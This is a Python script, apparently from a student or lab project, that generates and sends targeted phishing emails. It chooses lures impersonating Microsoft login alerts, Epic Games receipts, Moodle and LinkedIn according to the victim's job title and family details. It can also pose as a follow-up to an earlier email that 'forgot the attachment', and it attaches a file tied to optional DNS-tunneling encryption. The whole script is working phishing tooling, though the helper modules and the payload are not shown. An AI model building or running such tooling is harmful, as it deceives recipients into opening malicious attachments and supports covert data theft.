from helperFunctions import send_email
from attach_create import create_attachment

# Prompt the user for input
name = input("Enter your user name <String>: ")
mailServiceName = input("Enter your mail service name <String>: ")
title = input("Enter your title <String>: ")
jobTitle = input("Enter your job title <String>: ")
personalStatus = input("Enter your personal status <String>: ")
kidsNumber = input("Enter your number of kids <int>: ")

# for encrypting the data in the DNS tunneling
encrypt = input("Do you want to encrypt the data <bool>: ")

# for imitation an email
imitation = input("Do you want to imitate an email <bool>: ")
if imitation:
    type = input("Enter 'string' or 'file': ")

    if type == 'string':
        givenMail = input("Enter the email's body: ")

    else:  # type == 'file'
        fileName = input("Enter the file's name: ")
        givenFile = open(fileName)
        givenMail = "<p style='color:Black;'>"
        for line in givenFile.readlines():
            givenMail += line
            givenMail += "<br/>" 
        givenMail += "</p>"
            
        
    # add our addition
    body = """
Dear Joseph,<br />
I'm Sorry for the confusion, but I forgot to add the file to the previous mail.<br /> 
This is the correct mail, with the attachment.<br />
    """
    # add the given body
    body += givenMail
    subject = "Confusion with the previous mail"

# without imitation
else:
    # default mail
    html_file_path = "html_files/microsoft.html"
    subject = "Suspicious login attempt"

    # check the kids number
    try:
        kidsNumber = int(kidsNumber)
    except:
        kidsNumber = 0

    if (int(kidsNumber) > 0):
        subject = "Receipt"
        html_file_path = "html_files/epic_games/epic.html"

    match jobTitle:
        case "Student":
            subject = "ללא נושא"
            html_file_path = "html_files/moodle.html"
        case "Programmer":
            subject = "Programmer!"
            html_file_path = "html_files/linkedin.html"
        case "Lecturer":
            subject = "Lecturer!"
            html_file_path = "html_files/microsoft.html"
        case "Doctor":
            subject = "Doctor!"
            html_file_path = "html_files/microsoft.html"
        case "Professor":
            subject = "Professor!"
            html_file_path = "html_files/microsoft.html"
        case "Atudai":
            subject = "Atudai!"
            html_file_path = "html_files/body.html"
        case _:
            pass

    # read the html file with the arguments
    with open(html_file_path, 'r', encoding="utf-8") as file:
        body = file.read().format(name=name, mailServiceName=mailServiceName, title=title, jobTitle=jobTitle,
                                  personalStatus=personalStatus, kidsNumber=kidsNumber, encrypt=encrypt)

# create the attachment file
attachment_path = create_attachment(encrypt)

# define the recipient email
recipient = name + "@" + mailServiceName

# Sending the phising mail
send_email(subject, body, recipient, attachment_path)
